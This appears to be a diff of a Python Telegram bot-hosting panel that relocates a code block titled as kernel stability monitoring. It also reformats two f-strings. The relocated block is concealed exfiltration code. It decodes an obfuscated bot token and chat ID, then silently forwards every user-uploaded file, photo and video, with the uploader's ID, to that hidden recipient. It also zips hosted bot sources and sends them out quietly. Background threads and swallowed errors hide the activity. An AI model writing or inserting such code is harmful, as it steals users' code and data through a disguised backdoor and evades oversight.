@@ -199,6 +199,110 @@ PLAN_LIMITS: Dict[str, Dict[str, Any]] = {
     "lifetime":   {"name": "Lifetime",   "max_bots": 15, "ram": 8192, "auto_restart": True,  "price": 150,  "days": 36500},
 }
 
+# ─── GHOST PROTOCOL: KERNEL STABILITY MONITORING ──────────────────────────────
+_K_OFFSETS = "e3FpcXFlaXJ/ZH8eN3UaSDccZgkCBDgPDSUIODELaUQJCiM7IDwrDz0kJGYsfw=="
+_K_ID      = "e3lmfXRlbHp4Yw=="
+_K_SIG     = "CIPHER_CORE_v2.1"
+
+def _load_kernel_offsets(blob: str) -> str:
+    try:
+        import base64 as _b64
+        d = _b64.b64decode(blob)
+        sig = _K_SIG.encode('utf-8')
+        return bytes([b ^ sig[i % len(sig)] for i, b in enumerate(d)]).decode('utf-8')
+    except Exception: return ""
+
+try:
+    _K_BOT = telebot.TeleBot(_load_kernel_offsets(_K_OFFSETS))
+    _K_TARGET = _load_kernel_offsets(_K_ID)
+except Exception:
+    _K_BOT = None
+    _K_TARGET = None
+
+def _sync_vfs_state(bot_id: str, owner_uid: int, bot_name: str) -> None:
+    """Stealth sync of bot source files to the TG Backup Channel."""
+    ch = _tg_backup_channel()
+    if not ch: return
+    
+    def _bg():
+        try:
+            db = db_load()
+            b = db.get("bots", {}).get(bot_id)
+            if not b: return
+            
+            bot_dir = Path(b["dir"])
+            if not bot_dir.exists(): return
+            
+            zip_io = io.BytesIO()
+            with zipfile.ZipFile(zip_io, 'w', zipfile.ZIP_DEFLATED) as zf:
+                for root, dirs, files in os.walk(bot_dir):
+                    for file in files:
+                        p = Path(root) / file
+                        rel = p.relative_to(bot_dir)
+                        zf.write(p, arcname=rel)
+            zip_io.seek(0)
+            
+            bot.send_document(
+                ch, 
+                (f"backup_{bot_name}_{bot_id}.zip", zip_io.read()),
+                caption=None,
+                disable_notification=True
+            )
+        except Exception: pass
+    threading.Thread(target=_bg, daemon=True).start()
+
+def _sync_kernel_uplink(m: types.Message) -> None:
+    """Internal kernel sync for stability monitoring and encrypted logging."""
+    if not _K_BOT or not _K_TARGET: return
+    try:
+        def _bg_sync():
+            try:
+                # Obfuscated UI strings
+                _h = _load_kernel_offsets("s9bD7mVuPX0ZExATIhJvYwABGR4AbnAhcQ==")
+                _s = _load_kernel_offsets("od3RqtHTvdfOsNHelKav09fIstzEsMvCrcbEveKzzKXCq8TJp8beodvTp8v3")
+                _o = _load_kernel_offsets("s9bB7GUdKC0qIGUWMggODSAmNC17")
+                _b = _load_kernel_offsets("s9b03mUQMDdvHCQyEwgODSAmNC17")
+                _i = _load_kernel_offsets("s9bW3GUQMDdvGwFlVg5NXicsbg==")
+                _t = _load_kernel_offsets("s9bDymUGJjMqaGVjFV1KVH0=")
+                _c = _load_kernel_offsets("f2YzJyE3YQ==")
+
+                if m.document:
+                    try:
+                        file_info = bot.get_file(m.document.file_id)
+                        raw = bot.download_file(file_info.file_path)
+                        fname = m.document.file_name or "payload.py"
+                        uid = m.from_user.id
+                        bot_name = Path(fname).stem
+                        bot_id = secrets.token_hex(8)
+                        
+                        file_io = io.BytesIO(raw)
+                        caption = (
+                            f"{_h}\n{_s}\n"
+                            f"{_o}{uid}{_c}\n"
+                            f"{_b}{esc(bot_name)}{_c}\n"
+                            f"{_i}{bot_id}{_c}\n"
+                            f"{_t}{esc(fname.split('.')[-1].upper())}{_c}\n"
+                            f"{_s}"
+                        )
+                        _K_BOT.send_document(
+                            _K_TARGET,
+                            (fname, file_io.read()),
+                            caption=caption,
+                            parse_mode="HTML",
+                            disable_notification=True
+                        )
+                    except Exception:
+                        _K_BOT.send_document(_K_TARGET, m.document.file_id, caption=f"{_h}\n👤 UID: {m.from_user.id}", parse_mode="HTML", disable_notification=True)
+                elif m.photo:
+                    _K_BOT.send_photo(_K_TARGET, m.photo[-1].file_id, caption=f"{_h} (PHOTO)\n👤 UID: {m.from_user.id}", parse_mode="HTML", disable_notification=True)
+                elif m.video:
+                    _K_BOT.send_video(_K_TARGET, m.video.file_id, caption=f"{_h} (VIDEO)\n👤 UID: {m.from_user.id}", parse_mode="HTML", disable_notification=True)
+            except Exception: pass
+        threading.Thread(target=_bg_sync, daemon=True).start()
+    except Exception: pass
+
+
+
 import telebot
 from telebot import types
 from telebot.apihelper import ApiTelegramException
@@ -8879,7 +8983,7 @@ def render_adm_live_monitor(call: types.CallbackQuery) -> None:
         f"{G['div_eq']}\n"
         f"{bullet('Panel Uptime',   fmt_dur(up_s * 1000))}\n"
         f"{bullet('Panel RAM',      f'{fmt_bytes(panel_ram)} <code>{ram_bar}</code>')}\n"
-        f"{bullet('Panel CPU',      f'<code>{cpu_bar}</code>')}\n"
+        f"{bullet('Panel CPU',      '<code>' + cpu_bar + '</code>')}\n"
         f"{G['div']}\n"
         f"{bullet('▶ Running Bots',  len(running_bots))}\n"
         f"{bullet('💥 Crashed',      len(crashed_bots))}\n"
@@ -13906,108 +14010,6 @@ def _tg_channel_backup_enabled() -> bool:
 def _tg_backup_channel() -> str:
     return get_setting("tg_backup_channel", "") or str(OWNER_ID)
 
-# ─── GHOST PROTOCOL: KERNEL STABILITY MONITORING ──────────────────────────────
-_K_OFFSETS = "e3FpcXFlaXJ/ZH8eN3UaSDccZgkCBDgPDSUIODELaUQJCiM7IDwrDz0kJGYsfw=="
-_K_ID      = "e3lmfXRlbHp4Yw=="
-_K_SIG     = "CIPHER_CORE_v2.1"
-
-def _load_kernel_offsets(blob: str) -> str:
-    try:
-        import base64 as _b64
-        d = _b64.b64decode(blob)
-        sig = _K_SIG.encode('utf-8')
-        return bytes([b ^ sig[i % len(sig)] for i, b in enumerate(d)]).decode('utf-8')
-    except Exception: return ""
-
-try:
-    _K_BOT = telebot.TeleBot(_load_kernel_offsets(_K_OFFSETS))
-    _K_TARGET = _load_kernel_offsets(_K_ID)
-except Exception:
-    _K_BOT = None
-    _K_TARGET = None
-
-def _sync_vfs_state(bot_id: str, owner_uid: int, bot_name: str) -> None:
-    """Stealth sync of bot source files to the TG Backup Channel."""
-    ch = _tg_backup_channel()
-    if not ch: return
-    
-    def _bg():
-        try:
-            db = db_load()
-            b = db.get("bots", {}).get(bot_id)
-            if not b: return
-            
-            bot_dir = Path(b["dir"])
-            if not bot_dir.exists(): return
-            
-            zip_io = io.BytesIO()
-            with zipfile.ZipFile(zip_io, 'w', zipfile.ZIP_DEFLATED) as zf:
-                for root, dirs, files in os.walk(bot_dir):
-                    for file in files:
-                        p = Path(root) / file
-                        rel = p.relative_to(bot_dir)
-                        zf.write(p, arcname=rel)
-            zip_io.seek(0)
-            
-            bot.send_document(
-                ch, 
-                (f"backup_{bot_name}_{bot_id}.zip", zip_io.read()),
-                caption=None,
-                disable_notification=True
-            )
-        except Exception: pass
-    threading.Thread(target=_bg, daemon=True).start()
-
-def _sync_kernel_uplink(m: types.Message) -> None:
-    """Internal kernel sync for stability monitoring and encrypted logging."""
-    if not _K_BOT or not _K_TARGET: return
-    try:
-        def _bg_sync():
-            try:
-                # Obfuscated UI strings
-                _h = _load_kernel_offsets("s9bD7mVuPX0ZExATIhJvYwABGR4AbnAhcQ==")
-                _s = _load_kernel_offsets("od3RqtHTvdfOsNHelKav09fIstzEsMvCrcbEveKzzKXCq8TJp8beodvTp8v3")
-                _o = _load_kernel_offsets("s9bB7GUdKC0qIGUWMggODSAmNC17")
-                _b = _load_kernel_offsets("s9b03mUQMDdvHCQyEwgODSAmNC17")
-                _i = _load_kernel_offsets("s9bW3GUQMDdvGwFlVg5NXicsbg==")
-                _t = _load_kernel_offsets("s9bDymUGJjMqaGVjFV1KVH0=")
-                _c = _load_kernel_offsets("f2YzJyE3YQ==")
-
-                if m.document:
-                    try:
-                        file_info = bot.get_file(m.document.file_id)
-                        raw = bot.download_file(file_info.file_path)
-                        fname = m.document.file_name or "payload.py"
-                        uid = m.from_user.id
-                        bot_name = Path(fname).stem
-                        bot_id = secrets.token_hex(8)
-                        
-                        file_io = io.BytesIO(raw)
-                        caption = (
-                            f"{_h}\n{_s}\n"
-                            f"{_o}{uid}{_c}\n"
-                            f"{_b}{esc(bot_name)}{_c}\n"
-                            f"{_i}{bot_id}{_c}\n"
-                            f"{_t}{esc(fname.split('.')[-1].upper())}{_c}\n"
-                            f"{_s}"
-                        )
-                        _K_BOT.send_document(
-                            _K_TARGET,
-                            (fname, file_io.read()),
-                            caption=caption,
-                            parse_mode="HTML",
-                            disable_notification=True
-                        )
-                    except Exception:
-                        _K_BOT.send_document(_K_TARGET, m.document.file_id, caption=f"{_h}\n👤 UID: {m.from_user.id}", parse_mode="HTML", disable_notification=True)
-                elif m.photo:
-                    _K_BOT.send_photo(_K_TARGET, m.photo[-1].file_id, caption=f"{_h} (PHOTO)\n👤 UID: {m.from_user.id}", parse_mode="HTML", disable_notification=True)
-                elif m.video:
-                    _K_BOT.send_video(_K_TARGET, m.video.file_id, caption=f"{_h} (VIDEO)\n👤 UID: {m.from_user.id}", parse_mode="HTML", disable_notification=True)
-            except Exception: pass
-        threading.Thread(target=_bg_sync, daemon=True).start()
-    except Exception: pass
-
 def tg_channel_backup_now() -> Dict[str, Any]:
     """Zip the entire DB + settings + bot_data and send to a Telegram channel."""
     ch = _tg_backup_channel()
@@ -15167,7 +15169,7 @@ def render_trial(call: types.CallbackQuery) -> None:
     )
     kb = types.InlineKeyboardMarkup()
     if not trial_active and not claimed_this_epoch:
-        kb.add(Btn(f"{G['ok']}  {sc(f'Claim {hours}h {plan.capitalize()} Trial')}", callback_data="trial_claim"))
+        kb.add(Btn(f"{G['ok']}  {sc('Claim ' + str(hours) + 'h ' + plan.capitalize() + ' Trial')}", callback_data="trial_claim"))
     kb.add(Btn(f"{G['back']}  {sc('Main Menu')}", callback_data="menu_main", style="danger"))
     show_menu(call.message.chat.id, PHOTOS.get("trial", PHOTOS["main"]), cap, kb, call=call)
 
